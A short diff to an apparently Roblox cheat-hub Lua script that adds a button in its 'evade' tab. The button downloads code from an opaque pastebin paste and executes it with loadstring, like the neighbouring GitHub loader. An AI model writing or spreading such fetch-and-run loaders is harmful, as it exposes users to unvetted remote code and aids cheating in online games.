@@ -1688,6 +1688,10 @@ local creds = window:Tab("evade",'6035145364')
 
 local tool = creds:section("『evade』",true)
 
+tool:Button("2frh8A2j",function()
+loadstring(game:HttpGet("https://pastebin.com/raw/2frh8A2j"))()
+end)
+
 tool:Button("Ardrakhub-v7",function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hungtu2121/Ardrakhubv7/main/Evade"))()
 end)
